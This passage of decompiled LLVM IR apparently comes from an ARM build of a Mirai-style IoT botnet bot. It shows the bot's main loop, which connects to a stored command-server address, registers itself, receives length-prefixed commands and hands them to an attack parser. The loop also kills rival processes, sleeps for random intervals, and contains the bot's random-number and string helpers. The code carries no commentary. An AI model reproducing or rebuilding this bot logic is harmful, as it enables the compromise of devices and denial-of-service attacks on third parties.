  %v2_edac = add i32 %v3_eda4, %v2_eaf4
  store i32 %v2_edac, i32* %r3.global-to-local, align 4
  %v1_edb0 = add i32 %v2_edac, -240
  %v2_edb0 = inttoptr i32 %v1_edb0 to i32*
  %v3_edb0 = load i32, i32* %v2_edb0, align 4
  %v1_edb4 = urem i32 %v2_ed94, 32
  %v6_edb8 = ashr i32 %v3_edb0, %v1_edb4
  store i32 %v6_edb8, i32* %r2.global-to-local, align 4
  %v1_edbc = urem i32 %v6_edb8, 2
  %v2_edbc = icmp eq i32 %v1_edbc, 0
  br i1 %v2_edbc, label %dec_label_pc_edc4, label %dec_label_pc_efe8

dec_label_pc_edc4:                                ; preds = %dec_label_pc_eda0, %dec_label_pc_ed90
  %v2_edc8 = load i8, i8* bitcast (i8** @global_var_246a8.137 to i8*), align 4
  %v3_edc8 = zext i8 %v2_edc8 to i32
  store i32 %v3_edc8, i32* @r4, align 4
  %v2_edcc = icmp eq i8 %v2_edc8, 0
  %v2_ee54 = load i32, i32* @global_var_24524.134, align 4
  br i1 %v2_edcc, label %dec_label_pc_ee54, label %dec_label_pc_edd4

dec_label_pc_edd4:                                ; preds = %dec_label_pc_edc4
  %v3_edd8 = udiv i32 %v2_ee54, 32
  store i32 %v2_eaf4, i32* %r2.global-to-local, align 4
  %v3_ede0 = mul nuw nsw i32 %v3_edd8, 4
  %v2_ede4 = add i32 %v3_ede0, %v2_eaf4
  store i32 %v2_ede4, i32* %r3.global-to-local, align 4
  %v1_ede8 = add i32 %v2_ede4, -368
  %v2_ede8 = inttoptr i32 %v1_ede8 to i32*
  %v3_ede8 = load i32, i32* %v2_ede8, align 4
  %v1_edec = urem i32 %v2_ee54, 32
  %v6_edf0 = ashr i32 %v3_ede8, %v1_edec
  store i32 %v6_edf0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_246a8.137 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_edfc = urem i32 %v6_edf0, 2
  %v2_edfc = icmp eq i32 %v1_edfc, 0
  store i8 0, i8* bitcast (i8** @global_var_246a8.137 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_24524.134 to i32), i32* @r5, align 4
  br i1 %v2_edfc, label %dec_label_pc_ee0c, label %dec_label_pc_ef78

dec_label_pc_ee0c:                                ; preds = %dec_label_pc_edd4
  store i32 60948, i32* @lr, align 4
  %v1_ee10 = icmp ne i32 %v2_ee54, -1
  call void @__pseudo_cond_branch(i1 %v1_ee10, i32 ptrtoint (i32* @global_var_16360.61 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_ee18 = load i32, i32* @r5, align 4
  %v2_ee18 = inttoptr i32 %v1_ee18 to i32*
  store i32 -1, i32* %v2_ee18, align 4
  %v1_ee20 = call i32 @sleep(i32 1)
  br label %dec_label_pc_ec54

dec_label_pc_ee28:                                ; preds = %dec_label_pc_ecd4
  store i32 %v2_eaf4, i32* %r2.global-to-local, align 4
  %v3_ee34 = mul nuw nsw i32 %v3_ee2c, 4
  %v2_ee38 = add i32 %v3_ee34, %v2_eaf4
  store i32 %v2_ee38, i32* %r3.global-to-local, align 4
  %v1_ee3c = add i32 %v2_ee38, -240
  %v2_ee3c = inttoptr i32 %v1_ee3c to i32*
  %v3_ee3c = load i32, i32* %v2_ee3c, align 4
  %v1_ee40 = urem i32 %v2_ee28, 32
  %v7_ee48 = shl i32 1, %v1_ee40
  %v8_ee48 = or i32 %v3_ee3c, %v7_ee48
  store i32 %v8_ee48, i32* %r2.global-to-local, align 4
  store i32 %v8_ee48, i32* %v2_ee3c, align 4
  br label %dec_label_pc_ed0c

dec_label_pc_ee54:                                ; preds = %dec_label_pc_edc4
  %v7_ee58 = icmp eq i32 %v2_ee54, -1
  store i32 ptrtoint (i32* @global_var_24524.134 to i32), i32* @r8, align 4
  br i1 %v7_ee58, label %dec_label_pc_ec54, label %dec_label_pc_ee64

dec_label_pc_ee64:                                ; preds = %dec_label_pc_ee54
  %v3_ee64 = udiv i32 %v2_ee54, 32
  store i32 %v2_eaf4, i32* %r2.global-to-local, align 4
  %v3_ee6c = mul nuw nsw i32 %v3_ee64, 4
  %v2_ee70 = add i32 %v3_ee6c, %v2_eaf4
  store i32 %v2_ee70, i32* %r3.global-to-local, align 4
  %v1_ee74 = add i32 %v2_ee70, -240
  %v2_ee74 = inttoptr i32 %v1_ee74 to i32*
  %v3_ee74 = load i32, i32* %v2_ee74, align 4
  %v1_ee78 = urem i32 %v2_ee54, 32
  %v6_ee7c = ashr i32 %v3_ee74, %v1_ee78
  store i32 %v6_ee7c, i32* %r2.global-to-local, align 4
  %v1_ee80 = urem i32 %v6_ee7c, 2
  %v2_ee80 = icmp eq i32 %v1_ee80, 0
  br i1 %v2_ee80, label %dec_label_pc_ec54, label %dec_label_pc_ee88

dec_label_pc_ee88:                                ; preds = %dec_label_pc_ee64
  %v6_ee8c = inttoptr i32 %v3_edc8 to i8*
  store i8* %v6_ee8c, i8** %stack_var_-42, align 4
  store i32 %v2_ef64, i32* @sl, align 4
  %v0_ee90 = call i32 @__GI___errno_location()
  %v0_ee94 = load i32, i32* @r4, align 4
  %v2_ee94 = inttoptr i32 %v0_ee90 to i32*
  store i32 %v0_ee94, i32* %v2_ee94, align 4
  store i32 %v0_ee90, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_eea4 = load i32, i32* @global_var_24524.134, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_eeb0 = call i32 @__libc_recv(i32 %v2_eea4, i32 %v2_ef64, i32 2, i32 16386)
  %v7_eeb4 = icmp eq i32 %v4_eeb0, -1
  br i1 %v7_eeb4, label %dec_label_pc_f094, label %dec_label_pc_eebc

dec_label_pc_eebc:                                ; preds = %dec_label_pc_ee88
  %v2_eebc = icmp eq i32 %v4_eeb0, 0
  br i1 %v2_eebc, label %dec_label_pc_f0a4, label %dec_label_pc_eec4

dec_label_pc_eec4:                                ; preds = %dec_label_pc_eebc
  store i32 %v2_ed80, i32* %ip.global-to-local, align 4
  %v3_eec8 = load i8*, i8** %stack_var_-42, align 4
  %v4_eec8 = ptrtoint i8* %v3_eec8 to i32
  store i32 %v4_eec8, i32* %r3.global-to-local, align 4
  %v2_eecc = icmp eq i8* %v3_eec8, null
  br i1 %v2_eecc, label %dec_label_pc_eed4, label %dec_label_pc_f0d4

dec_label_pc_eed4:                                ; preds = %dec_label_pc_eec4
  %v2_eed4 = load i32, i32* @global_var_24524.134, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_eee0 = add i32 %v4_eec8, 16384
  store i32 %v1_eee0, i32* %r3.global-to-local, align 4
  %v4_eee4 = call i32 @__libc_recv(i32 %v2_eed4, i32 %v2_ef64, i32 2, i32 %v1_eee0)
  br label %dec_label_pc_ec54

dec_label_pc_eeec:                                ; preds = %dec_label_pc_ecc4
  %v0_eef4 = load i32, i32* @r4, align 4
  store i32 %v0_eef4, i32* %r2.global-to-local, align 4
  %v3_eef8 = call i32 @socket(i32 2, i32 1, i32 %v0_eef4)
  %v7_eefc = icmp eq i32 %v3_eef8, -1
  store i32 %v3_eef8, i32* @r5, align 4
  %v1_ef04 = load i32, i32* @r8, align 4
  %v2_ef04 = inttoptr i32 %v1_ef04 to i32*
  store i32 %v3_eef8, i32* %v2_ef04, align 4
  br i1 %v7_eefc, label %dec_label_pc_ecd4, label %dec_label_pc_ef0c

dec_label_pc_ef0c:                                ; preds = %dec_label_pc_eeec
  %v0_ef0c = load i32, i32* @r4, align 4
  store i32 %v0_ef0c, i32* @r2, align 4
  %v2_ef14 = call i32 @__libc_fcntl(i32 %v3_eef8, i32 3)
  %v1_ef1c = or i32 %v2_ef14, 2048
  store i32 %v1_ef1c, i32* @r2, align 4
  %v0_ef20 = load i32, i32* @r5, align 4
  %v2_ef24 = call i32 @__libc_fcntl(i32 %v0_ef20, i32 4)
  %v2_ef2c = load i32, i32* @global_var_24528.112, align 4
  store i32 %v2_ef2c, i32* %r3.global-to-local, align 4
  %v2_ef30 = icmp eq i32 %v2_ef2c, 0
  br i1 %v2_ef30, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_ef0c
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_ef0c, %bb42
  %v2_ef38 = xor i1 %v2_ef30, true
  call void @__pseudo_cond_branch(i1 %v2_ef38, i32 ptrtoint (i32* @global_var_1279c.139 to i32))
  store i32 ptrtoint (i8** @global_var_246a8.137 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_ef44 = load i32, i32* @global_var_24524.134, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_246a8.137 to i8*), align 4
  %v4_ef54 = call i32 @__libc_connect(i32 %v2_ef44, i32 ptrtoint (i16** @global_var_271c0.114 to i32), i32 16)
  br label %dec_label_pc_ecd4

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ed5c
  %v2_ef60 = load i32, i32* @global_var_24524.134, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_ef70 = call i32 @__libc_send(i32 %v2_ef60, i32 %v2_ef64, i32 2, i32 16384)
  br label %dec_label_pc_ed90

dec_label_pc_ef78:                                ; preds = %dec_label_pc_edd4
  store i32 4, i32* @r4, align 4
  store i32 %v2_ef80, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_ef5c, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_ef9c = call i32 @getsockopt(i32 %v2_ee54, i32 1, i32 4, i32 %v2_ef80, i32 %v2_ef5c)
  %v3_efa0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_efa0, i32* %r3.global-to-local, align 4
  %v2_efa4 = icmp eq i32 %v3_efa0, 0
  br i1 %v2_efa4, label %dec_label_pc_f030, label %dec_label_pc_efac

dec_label_pc_efac:                                ; preds = %dec_label_pc_ef78
  %v2_efac = load i32, i32* @global_var_24524.134, align 4
  %v1_efb0 = call i32 @__GI___libc_close(i32 %v2_efac)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_efb8 = load i32, i32* @r5, align 4
  %v2_efb8 = inttoptr i32 %v1_efb8 to i32*
  store i32 -1, i32* %v2_efb8, align 4
  %v0_efbc = call i32 @rand_next()
  %v3_efc4 = zext i32 %v0_efbc to i64
  %v4_efc4 = mul nuw i64 %v3_efc4, 3435973837
  %v7_efc4 = trunc i64 %v4_efc4 to i32
  store i32 %v7_efc4, i32* %ip.global-to-local, align 4
  %v3_efc82 = udiv i64 %v4_efc4, 34359738368
  %v3_efcc4 = mul nuw nsw i64 %v3_efc82, 8
  %v3_efcc = trunc i64 %v3_efcc4 to i32
  store i32 %v3_efcc, i32* %r2.global-to-local, align 4
  %v2_efd06 = mul nuw nsw i64 %v3_efc82, 2
  %v2_efd0 = trunc i64 %v2_efd06 to i32
  %v2_efd4 = add i32 %v3_efcc, %v2_efd0
  store i32 %v2_efd4, i32* %r3.global-to-local, align 4
  %v2_efd8 = sub i32 %v0_efbc, %v2_efd4
  %v1_efdc = add i32 %v2_efd8, 1
  %v1_efe0 = call i32 @sleep(i32 %v1_efdc)
  br label %dec_label_pc_ec54

dec_label_pc_efe8:                                ; preds = %dec_label_pc_eda0
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_ef80, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_effc = call i32 @__libc_accept(i32 %v2_ed94, i32 %v2_eff4, i32 %v2_ef80, i32 16, i32 16)
  %v1_f000 = call i32 @scanner_kill(i32 %v5_effc)
  %v1_f004 = call i32 @killer_kill(i32 %v1_f000)
  %v2_f014 = call i32 @kill(i32 %v1_f010, i32 9)
  store i32 ptrtoint (i32* @global_var_246a4.124 to i32), i32* %r3.global-to-local, align 4
  %v2_f01c = load i32, i32* @global_var_246a4.124, align 4
  %v2_f020 = icmp eq i32 %v2_f01c, 0
  br i1 %v2_f020, label %dec_label_pc_f028, label %dec_label_pc_f0c8

dec_label_pc_f028:                                ; preds = %dec_label_pc_efe8, %dec_label_pc_f0c8
  %v1_f02c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_f030

dec_label_pc_f030:                                ; preds = %dec_label_pc_ef78, %dec_label_pc_f028
  %v2_f034 = call i32 @util_strlen(i8* %v1_f034)
  %sext = mul i32 %v2_f034, 16777216
  %v1_f038 = sdiv i32 %sext, 16777216
  %v7_f038 = inttoptr i32 %v1_f038 to i8*
  store i8* %v7_f038, i8** %stack_var_-42, align 4
  %v0_f03c = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_271b8.90 to i32), i32* @lr, align 4
  %v0_f044 = load i32, i32* @r4, align 4
  store i32 %v0_f044, i32* %r2.global-to-local, align 4
  store i32 %v0_f03c, i32* @global_var_271b8.90, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f054 = load i32, i32* @r5, align 4
  %v1_f054 = inttoptr i32 %v0_f054 to i32*
  %v2_f054 = load i32, i32* %v1_f054, align 4
  %v4_f058 = call i32 @__libc_send(i32 %v2_f054, i32 ptrtoint (i32* @global_var_1b3fc.143 to i32), i32 %v0_f044, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_f064 = load i32, i32* @r5, align 4
  %v1_f064 = inttoptr i32 %v0_f064 to i32*
  %v2_f064 = load i32, i32* %v1_f064, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f070 = call i32 @__libc_send(i32 %v2_f064, i32 %v2_ef64, i32 1, i32 16384)
  %v3_f074 = load i8*, i8** %stack_var_-42, align 4
  %v4_f074 = ptrtoint i8* %v3_f074 to i32
  store i32 %v4_f074, i32* %r2.global-to-local, align 4
  %v3_f078 = icmp eq i8* %v3_f074, null
  br i1 %v3_f078, label %dec_label_pc_ec54, label %dec_label_pc_f080

dec_label_pc_f080:                                ; preds = %dec_label_pc_f030
  %v0_f080 = load i32, i32* @r5, align 4
  %v1_f080 = inttoptr i32 %v0_f080 to i32*
  %v2_f080 = load i32, i32* %v1_f080, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_f08c = call i32 @__libc_send(i32 %v2_f080, i32 %v2_ea90, i32 %v4_f074, i32 16384)
  br label %dec_label_pc_ec54

dec_label_pc_f094:                                ; preds = %dec_label_pc_f104, %dec_label_pc_ee88
  %v0_f094 = load i32, i32* @r5, align 4
  %v1_f094 = inttoptr i32 %v0_f094 to i32*
  %v2_f094 = load i32, i32* %v1_f094, align 4
  store i32 %v2_f094, i32* %r3.global-to-local, align 4
  %v7_f098 = icmp eq i32 %v2_f094, 4
  br i1 %v7_f098, label %dec_label_pc_ec54, label %bb44

bb44:                                             ; preds = %dec_label_pc_f094
  %v8_f09c = icmp eq i32 %v2_f094, 11
  br i1 %v8_f09c, label %dec_label_pc_ec54, label %dec_label_pc_f0a4

dec_label_pc_f0a4:                                ; preds = %dec_label_pc_f128, %bb44, %dec_label_pc_eebc
  %v2_f0a4 = load i32, i32* @global_var_24524.134, align 4
  store i32 61616, i32* @lr, align 4
  %v1_f0ac = icmp ne i32 %v2_f0a4, -1
  call void @__pseudo_cond_branch(i1 %v1_f0ac, i32 ptrtoint (i32* @global_var_16360.61 to i32))
  store i32 ptrtoint (i32* @global_var_24524.134 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_24524.134, align 4
  %v1_f0c0 = call i32 @sleep(i32 1)
  br label %dec_label_pc_ec54

dec_label_pc_f0c8:                                ; preds = %dec_label_pc_efe8
  %v2_f0cc = call i32 @kill(i32 %v2_f01c, i32 9)
  br label %dec_label_pc_f028

dec_label_pc_f0d4:                                ; preds = %dec_label_pc_eec4
  %v3_f0d4 = udiv i32 %v4_eec8, 256
  %v1_f0d8 = urem i32 %v4_eec8, 256
  store i32 %v1_f0d8, i32* %r3.global-to-local, align 4
  %v4_f0dc = mul nuw nsw i32 %v1_f0d8, 256
  %v5_f0dc = or i32 %v4_f0dc, %v3_f0d4
  %v6_f0dc = trunc i32 %v5_f0dc to i16
  store i32 %v5_f0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_ed80, i32* @lr, align 4
  %v7_f0e8 = inttoptr i32 %v5_f0dc to i8*
  store i8* %v7_f0e8, i8** %stack_var_-42, align 4
  %tmp45 = icmp ult i16 %v6_f0dc, 1025
  br i1 %tmp45, label %dec_label_pc_f104, label %dec_label_pc_f0f0

dec_label_pc_f0f0:                                ; preds = %dec_label_pc_f0d4
  %v2_f0f0 = load i32, i32* @global_var_24524.134, align 4
  %v1_f0f4 = call i32 @__GI___libc_close(i32 %v2_f0f0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_f0fc = load i32, i32* @r8, align 4
  %v2_f0fc = inttoptr i32 %v1_f0fc to i32*
  store i32 -1, i32* %v2_f0fc, align 4
  br label %dec_label_pc_ec54

dec_label_pc_f104:                                ; preds = %dec_label_pc_f0d4
  %v0_f104 = load i32, i32* @r4, align 4
  %v1_f104 = load i32, i32* @r5, align 4
  %v2_f104 = inttoptr i32 %v1_f104 to i32*
  store i32 %v0_f104, i32* %v2_f104, align 4
  store i32 %v2_f10c, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_f114 = load i32, i32* @global_var_24524.134, align 4
  %v7_f11c = call i32 @__libc_recv(i32 %v2_f114, i32 %v2_f10c, i32 %v5_f0dc, i32 16386)
  %v7_f120 = icmp eq i32 %v7_f11c, -1
  br i1 %v7_f120, label %dec_label_pc_f094, label %dec_label_pc_f128

dec_label_pc_f128:                                ; preds = %dec_label_pc_f104
  %v2_f128 = icmp eq i32 %v7_f11c, 0
  br i1 %v2_f128, label %dec_label_pc_f0a4, label %dec_label_pc_f130

dec_label_pc_f130:                                ; preds = %dec_label_pc_f128
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_f13c = load i32, i32* @global_var_24524.134, align 4
  %v4_f140 = call i32 @__libc_recv(i32 %v2_f13c, i32 %v2_ef64, i32 2, i32 16384)
  %v3_f148 = load i8*, i8** %stack_var_-42, align 4
  %v4_f148 = ptrtoint i8* %v3_f148 to i32
  %v3_f14c = udiv i32 %v4_f148, 256
  %v1_f150 = mul i32 %v4_f148, 256
  %v4_f154 = and i32 %v1_f150, 65280
  %v5_f154 = or i32 %v4_f154, %v3_f14c
  store i32 %v5_f154, i32* %ip.global-to-local, align 4
  store i32 %v2_ed80, i32* @lr, align 4
  store i32 %v5_f154, i32* %r2.global-to-local, align 4
  %v2_f164 = load i32, i32* @global_var_24524.134, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f16c = inttoptr i32 %v5_f154 to i8*
  store i8* %v6_f16c, i8** %stack_var_-42, align 4
  %v6_f170 = call i32 @__libc_recv(i32 %v2_f164, i32 %v2_f10c, i32 %v5_f154, i32 16384)
  store i32 %v2_ed80, i32* %r2.global-to-local, align 4
  %v3_f178 = load i8*, i8** %stack_var_-42, align 4
  %v3_f17c = icmp eq i8* %v3_f178, null
  br i1 %v3_f17c, label %dec_label_pc_ec54, label %dec_label_pc_f184

dec_label_pc_f184:                                ; preds = %dec_label_pc_f130
  %v4_f178 = ptrtoint i8* %v3_f178 to i32
  %v5_f188 = call i32 @attack_parse(i32* nonnull %stack_var_-1432, i32 %v4_f178, i32 %v2_ed80)
  br label %dec_label_pc_ec54

; uselistorder directives
  uselistorder i8* %v3_f178, { 1, 0 }
  uselistorder i32 %v5_f154, { 1, 0, 2, 3 }
  uselistorder i32 %v7_f11c, { 1, 0 }
  uselistorder i32 %v5_f0dc, { 1, 0, 3, 2 }
  uselistorder i32 %v3_eef8, { 3, 2, 1, 0 }
  uselistorder i32 %v4_eec8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_eeb0, { 1, 0 }
  uselistorder i32 %v2_ee54, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_ed94, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_ed7c, { 1, 0, 2 }
  uselistorder i32 %v5_ed48, { 1, 2, 0 }
  uselistorder i32 %v2_ec94, { 2, 1, 0 }
  uselistorder i32 %v1_ec84, { 1, 2, 0 }
  uselistorder i32 %v1_ec68, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_ef80, { 1, 0, 2, 3 }
  uselistorder i32 %v2_ef64, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_ef5c, { 1, 0 }
  uselistorder i32 %v2_ed80, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_ec50, { 1, 0, 2 }
  uselistorder i32 %v2_eaf4, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7 }
  uselistorder i32 %v2_eae0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 30, 29, 33, 31, 32, 24, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_246a4.124, { 1, 2, 0 }
  uselistorder i8* null, { 0, 2, 1 }
  uselistorder i32 16386, { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 (i32)* @sleep, { 9, 8, 3, 1, 2, 7, 6, 5, 4, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_246a8.137 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_246a8.137 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_24520.119, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_24524.134, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i8*, i32)* @util_strcpy, { 25, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1, 2, 58, 3, 59, 4, 60, 61, 20, 21, 22, 23, 24, 57, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 (i32, i32)* @rand_alphastr, { 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32* @global_var_24528.112, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_e764.110 to i32), { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_f030, { 1, 0 }
  uselistorder label %dec_label_pc_f028, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_ed90, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_ecd4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ecc4, { 1, 0 }
  uselistorder label %dec_label_pc_ec54, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_eab4, { 2, 0, 1 }
}

define i32 @function_f1b8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f1b8:
  %v0_f1b8 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_f1b8, i32 -22307732)
  %v0_f1c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f1c0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f1b8
  %v1_f1c4 = load i32, i32* @fp, align 4
  store i32 %v1_f1c4, i32* %arg1, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f1b8, %bb
  %v8_f1c4 = load i32, i32* @r0, align 4
  ret i32 %v8_f1c4

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_f1d4 = load i32, i32* @global_var_246ac.145, align 4
  %v2_f1d8 = load i32, i32* @global_var_246b8.147, align 4
  %v4_f1e4 = mul i32 %v2_f1d4, 2048
  %v5_f1e4 = xor i32 %v4_f1e4, %v2_f1d4
  %v4_f1e8 = udiv i32 %v2_f1d8, 524288
  %v5_f1e8 = xor i32 %v4_f1e8, %v2_f1d8
  %v2_f1ec = load i32, i32* @global_var_246b0.149, align 4
  %v2_f1f0 = load i32, i32* @global_var_246b4.151, align 4
  %v2_f1f4 = xor i32 %v5_f1e8, %v5_f1e4
  %v4_f1f8 = udiv i32 %v5_f1e4, 256
  %v5_f1f8 = xor i32 %v2_f1f4, %v4_f1f8
  store i32 %v2_f1ec, i32* @global_var_246ac.145, align 4
  store i32 %v2_f1f0, i32* @global_var_246b0.149, align 4
  store i32 %v2_f1d8, i32* @global_var_246b4.151, align 4
  store i32 %v5_f1f8, i32* @global_var_246b8.147, align 4
  ret i32 %v5_f1f8

; uselistorder directives
  uselistorder i32 %v2_f1d8, { 2, 1, 0 }
  uselistorder i32 %v2_f1d4, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_f230 = call i32 @__GI_time(i32* null)
  store i32 %v2_f230, i32* @global_var_246ac.145, align 4
  %v1_f23c = call i32 @__getpid(i32 %v2_f230)
  store i32 %v1_f23c, i32* @r0, align 4
  %v0_f244 = call i32 @getppid()
  %v2_f24c = xor i32 %v1_f23c, %v0_f244
  store i32 %v2_f24c, i32* @global_var_246b0.149, align 4
  %v1_f254 = call i32 @clock(i32 %v2_f24c)
  %v2_f258 = load i32, i32* @global_var_246b0.149, align 4
  %v2_f264 = xor i32 %v2_f258, %v1_f254
  store i32 %v2_f264, i32* @global_var_246b8.147, align 4
  store i32 %v1_f254, i32* @global_var_246b4.151, align 4
  ret i32 %v1_f254

; uselistorder directives
  uselistorder i32 %v1_f254, { 1, 2, 0 }
}

define i32 @rand_alphastr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_f28c = load i32, i32* @r4, align 4
  %v6_f28c = load i32, i32* @r5, align 4
  %v9_f28c = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_f2a0 = call i32 @table_unlock_val(i32 61)
  %v3_f2ac = call i32 @table_retrieve_val(i32 61, i32* null)
  store i32 %v3_f2ac, i32* @r1, align 4
  %v2_f2b8 = bitcast i32* %stack_var_-72 to i8*
  %v3_f2b8 = call i32 @strcpy(i8* %v2_f2b8, i32 %v3_f2ac)
  %v2_f2bc = icmp eq i32 %arg2, 0
  br i1 %v2_f2bc, label %dec_label_pc_f338, label %dec_label_pc_f2c4

dec_label_pc_f2c4:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_246ac.145 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_246b0.149 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_246b4.151 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_246b8.147 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_f31c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_f2d8

dec_label_pc_f2d8:                                ; preds = %dec_label_pc_f2d8.dec_label_pc_f2d8_crit_edge, %dec_label_pc_f2c4
  %v1_f2fc = phi i32 [ %v1_f2fc.pre, %dec_label_pc_f2d8.dec_label_pc_f2d8_crit_edge ], [ ptrtoint (i32* @global_var_246ac.145 to i32), %dec_label_pc_f2c4 ]
  %v2_f2d8 = load i32, i32* @global_var_246b8.147, align 4
  store i32 %v2_f2d8, i32* %r2.global-to-local, align 4
  %v2_f2dc = load i32, i32* @global_var_246ac.145, align 4
  %v4_f2e0 = udiv i32 %v2_f2d8, 524288
  %v5_f2e0 = xor i32 %v4_f2e0, %v2_f2d8
  %v4_f2e4 = mul i32 %v2_f2dc, 2048
  %v5_f2e4 = xor i32 %v4_f2e4, %v2_f2dc
  %v2_f2e8 = xor i32 %v5_f2e0, %v5_f2e4
  %v2_f2ec = load i32, i32* @global_var_246b0.149, align 4
  %v2_f2f0 = load i32, i32* @global_var_246b4.151, align 4
  store i32 %v2_f2f0, i32* %ip.global-to-local, align 4
